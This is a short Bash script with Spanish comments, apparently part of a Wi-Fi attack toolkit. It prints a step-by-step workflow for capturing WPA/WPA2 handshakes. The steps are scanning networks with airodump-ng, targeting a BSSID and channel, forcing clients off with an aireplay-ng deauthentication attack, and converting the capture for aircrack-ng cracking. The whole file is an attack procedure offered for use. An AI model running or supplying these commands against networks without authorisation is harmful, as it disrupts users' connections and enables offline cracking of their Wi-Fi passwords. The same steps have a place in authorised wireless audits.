#!/bin/bash

# WIFI HANDSHAKE - Captura handshake WPA/WPA2
# Uso: ./wifi_handshake.sh <INTERFACE>
# Ejemplo: ./wifi_handshake.sh wlan0mon

INTERFACE="$1"
MODULE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUTPUT_DIR="$MODULE_DIR/captures/handshakes"

if [[ -z "$INTERFACE" ]]; then
    echo "Uso: ./wifi_handshake.sh <INTERFACE>"
    echo "Ejemplo: ./wifi_handshake.sh wlan0mon"
    echo ""
    echo "Interfaces en modo monitor:"
    iw dev | grep -A 4 "type monitor" | grep Interface | awk '{print $2}'
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "🔑 Capturando handshake en: $INTERFACE"
echo "────────────────────────────────────────"
echo " ⚠️ Necesitas airodump-ng instalado"
echo " ⚠️ Debes conocer el BSSID y canal de la red"
echo ""

echo " 1. Primero, escanea redes:"
echo " sudo airodump-ng $INTERFACE"
echo ""
echo " 2. Luego, captura handshake:"
echo " sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w $OUTPUT_DIR/handshake $INTERFACE"
echo ""
echo " 3. Para forzar handshake (deauth):"
echo " sudo aireplay-ng -0 5 -a <BSSID> $INTERFACE"
echo ""
echo " 4. Verificar handshake:"
echo " aircrack-ng -J $OUTPUT_DIR/handshake-01.cap"
echo ""
echo "📁 Capturas guardadas en: $OUTPUT_DIR"
